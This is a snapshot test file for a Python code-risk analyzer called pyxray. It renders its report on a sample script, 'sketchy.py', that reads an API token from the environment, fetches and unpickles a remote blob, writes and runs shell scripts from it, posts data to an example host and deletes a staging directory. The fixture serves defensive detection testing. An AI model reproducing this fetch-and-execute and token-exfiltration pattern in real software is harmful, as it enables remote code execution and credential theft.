@@ -1,0 +1,67 @@
+---
+source: crates/pyxray-render/tests/snapshots.rs
+expression: text
+---
++--------------------------------------------------------------------------------------------------+
+| pyxray  sketchy.py                             21 lines | 16 statements | depth 2 | cyclomatic 2 |
+| reads the environment -> makes 2 network calls -> DELETES /tmp/stage -> evaluates code at runti~ |
+| risk ##################  100  read it first                                    .>X ~$e ! .... .. |
++--------------------------------------------------------------------------------------------------+
++- TEXTURE ----------------------------------------------------------------------------------------+
+| __________...__________....__________....______________...._____----######----....______________ |
+|              !!!!!!        !!!!!>>>>>    !!!!!    !!!!!         >>>>>>>>>!!!!!    !!!!!!!!!!.... |
+| L1                                                                                          L21  |
++--------------------------------------------------------------------------------------------------+
++- FLOW -----------------------------------------------+  +- CAPABILITIES -------------------------+
+|    1   |- import os, subprocess, shutil, pickle, b~  |  |  ~ net 2!   e env 2!   $ shell 2!      |
+|    2   |- import requests                            |  |  X delete 1!   ! eval 1!   > write 3   |
+|    4 ! |- TOKEN = os.environ["API_TOKEN"]        env |  |  . print 1                             |
+|    5   |- STAGING = "/tmp/stage"                     |  +----------------------------------------+
+|    7 ! |- shutil.rmtree(STAGING, ignore_err~  delete |  +- WHAT IT DOES -------------------------+
+|    8   |- os.makedirs(STAGING)                 write |  |    4 ! e getenv   ~! reads a secret f~ |
+|   10 ! |- resp = requests.get("https://example~  net |  |    7 ! X rmtree   ~! recursively dele~ |
+|   11   |- blob = base64.b64decode(resp.content)      |  |    8   > mkdir    /tmp/stage           |
+|   12 ! |- config = pickle.loads(blob)           eval |  |   10 ! ~ GET      ~! verify=False - T~ |
+|   14 ! |- for name, script in config["steps"]        |  |   12 ! ! unpickle ~! unpickling runs ~ |
+|   15   |  |- with open(f"{STAGING}/{name}.sh~  write |  |   15 - > truncate f"{STAGING}/{name}.~ |
+|   16   |  |  `- fh.write(script)               write |  |   16 - > write    open(f"{STAGING}/{n~ |
+|   17 ! |  `- subprocess.run(f"bash {STAGING}~  shell |  |   17 ! $ run      ~! runs an external~ |
+|   19 ! |- requests.post("https://example.i~  net env |  |   19 ! ~ POST     ~! sends data to a ~ |
+|   20 ! |- subprocess.run(["rm", "-rf", STAGI~  shell |  |   19   e probe    os.uname             |
+|   21   `- print("done")                        print |  |   20 ! $ run      ~! runs an external~ |
++------------------------------------------------------+  |   21   . print    done                 |
+                                                          +----------------------------------------+
+                                                          +- IMPORTS ------------------------------+
+                                                          |   os                                   |
+                                                          |   subprocess                           |
+                                                          |   shutil                               |
+                                                          |   pickle                               |
+                                                          |   base64                               |
+                                                          | * requests                             |
+                                                          +----------------------------------------+
+                                                          +- VALUES -------------------------------+
+                                                          |    4 TOKEN   ?        os.environ["AP~  |
+                                                          |    5 STAGING str      "/tmp/stage"     |
+                                                          |   10 resp    response requests.get("~  |
+                                                          |   11 blob    ?        base64.b64deco~  |
+                                                          |   12 config  ?        pickle.loads(b~  |
+                                                          |   14 name    ?        config["steps"]  |
+                                                          |   14 script  ?        config["steps"]  |
+                                                          |   15 fh      file     open(f"{STAGIN~  |
+                                                          +----------------------------------------+
+                                                          +- CALLS --------------------------------+
+                                                          | subprocess.run                      x2 |
+                                                          | open                                   |
+                                                          | print                                  |
+                                                          | base64.b64decode                       |
+                                                          | <file>.write                           |
+                                                          | os.makedirs                            |
+                                                          | os.uname                               |
+                                                          | pickle.loads                           |
+                                                          | requests.get                           |
+                                                          | requests.post                          |
+                                                          +----------------------------------------+
+                                                          +- SHAPE --------------------------------+
+                                                          | 21    16    2     2     0     12       |
+                                                          | lines stmts depth cyclo defs  calls    |
+                                                          +----------------------------------------+
